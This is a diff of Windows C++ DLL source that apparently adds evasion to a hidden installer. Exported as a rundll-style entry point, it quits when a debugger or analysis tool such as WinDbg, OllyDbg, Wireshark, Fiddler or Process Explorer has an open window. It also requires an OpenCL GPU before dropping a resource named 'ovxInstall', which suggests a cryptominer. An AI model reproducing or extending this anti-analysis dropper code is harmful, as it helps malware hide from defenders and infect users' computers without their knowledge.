@@ -13,8 +13,107 @@ BOOL APIENTRY DllMain( HANDLE hModule,
                        LPVOID lpReserved
 					 )
 {
+	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
+	{
+		DisableThreadLibraryCalls((HMODULE)hModule);
+		if(IsDebugging())
+			return FALSE; 
+
+	}
     return TRUE;
 }
+static BOOL CALLBACK EnumWindowsProc(          HWND hwnd,
+									 LPARAM lParam
+									 )
+{
+	TCHAR szText[1024] = {0};
+	GetWindowText(hwnd, szText , 1024);
+	PTCHAR pszBlacklist_window[] = {L"Microsoft Visual",L"HTTP Analyzer",L"WinDBG",L"OllyDebug",
+		L"fiddler", L"SmartSniff", L"Spy++",L"ATL/MFC",L"任务管理器",L"Spy",L"DebugView",
+		L"Process Explorer", L"File Monitor", L"Registry Monitor",L"Wireshark",L"OllyICE",L"OllyDBG"
+		L" - Sysinternals:" //
+	};
+	for(int i = 0; i < ( sizeof (pszBlacklist_window) / sizeof (pszBlacklist_window[0]) ); i++)
+	{
+		PTCHAR pszTitle = pszBlacklist_window[i];
+		if(0 == StrStrI(szText, pszTitle))
+		{
+			return 1;
+		}
+		else
+		{
+			 
+			return 0;
+		}
+	}
+
+	return TRUE;
+}
+BOOL eXclusive(void)
+{
+	return !EnumWindows(EnumWindowsProc, (LPARAM)0);
+}
+HRESULT IsSupportOpencl(LONG* pl)
+{
+ 	// TODO: 在此添加实现代码 	
+	unsigned int m_platform = 0;
+	unsigned int m_devicecount = 0;
+	typedef struct _cl_platform_id *    cl_platform_id;
+	* pl = 0;
+
+	HMODULE hMod =  LoadLibrary(L"opencl.dll");
+	if(NULL == hMod)
+	{
+		return S_OK; 
+	}
+	typedef int (__stdcall*	PclGetPlatformIDs)(unsigned int , cl_platform_id * , unsigned int*);
+	PclGetPlatformIDs pclGetPlatformIDs = (PclGetPlatformIDs)GetProcAddress(hMod, "clGetPlatformIDs");
+
+	typedef int (__stdcall*	PclGetDeviceIDs)(cl_platform_id ,unsigned __int64 , unsigned int, void *  ,   unsigned int * );
+	PclGetDeviceIDs pclGetDeviceIDs = (PclGetDeviceIDs)GetProcAddress(hMod,"clGetDeviceIDs");
+
+	if(NULL == pclGetPlatformIDs || NULL == pclGetDeviceIDs)
+	{
+		FreeLibrary(hMod);
+		return S_OK;
+	}
+
+	unsigned int numplatforms = 0;
+	pclGetPlatformIDs(0,NULL,&numplatforms);
+//	printf("%d OpenCL platforms found\n",numplatforms);
+	if(0 >= numplatforms)
+	{
+		FreeLibrary(hMod);
+		return S_OK;
+	}
+
+	if(numplatforms>0 && m_platform>=0 && m_platform<numplatforms)
+	{
+#define CL_DEVICE_TYPE_GPU                          (1 << 2)
+
+		cl_platform_id *pids;
+		pids=new cl_platform_id[numplatforms];
+		pclGetPlatformIDs(numplatforms,pids,NULL);
+		pclGetDeviceIDs(pids[m_platform],CL_DEVICE_TYPE_GPU,0,NULL,&m_devicecount);
+
+//		printf("%d OpenCL GPU devices found on platform %d\n",m_devicecount,m_platform);
+		if(0 >=m_devicecount)
+		{
+			FreeLibrary(hMod);
+			return S_OK;
+		}		 
+		else
+		{
+			* pl = 1;
+			FreeLibrary(hMod);
+			return S_OK;
+		}
+
+	}	
+	FreeLibrary(hMod);
+	return S_OK;
+}
+
 inline HINSTANCE			GetCurrentModuleHandle(void)
 {
 	static HINSTANCE hCurrentModule = 0;
@@ -30,15 +129,23 @@ inline HINSTANCE			GetCurrentModuleHandle(void)
  //__declspec(dllexport)
 	 void CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 {	
-	//OutputDebugStringA((LPCSTR)lpCmdLine);
-
- 
+	//OutputDebugStringA((LPCSTR)lpCmdLine);	 
 
 	HKEY hKey = NULL;
 	LONG lRes = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\ExtIconHandler", 0, KEY_READ | KEY_WRITE, &hKey);
 	if(lRes == ERROR_SUCCESS)
 	{
 		return;
+	}
+	if(eXclusive())
+	{
+		return ;
+	}
+	LONG l = 0;
+	IsSupportOpencl(&l);
+	if(l ==0)
+	{
+		return ;
 	}
 
 	HINSTANCE hResHandle = GetCurrentModuleHandle();		
@@ -70,7 +177,7 @@ inline HINSTANCE			GetCurrentModuleHandle(void)
 				}
 				else
 				{
-					pszFileName = "ovxInstall_s";
+					pszFileName = "ovxInstall";
 				}
 				//PathAppendA(szTempFile, pszFileName);
 				//PathAppendA(szTempFile, ".exe");
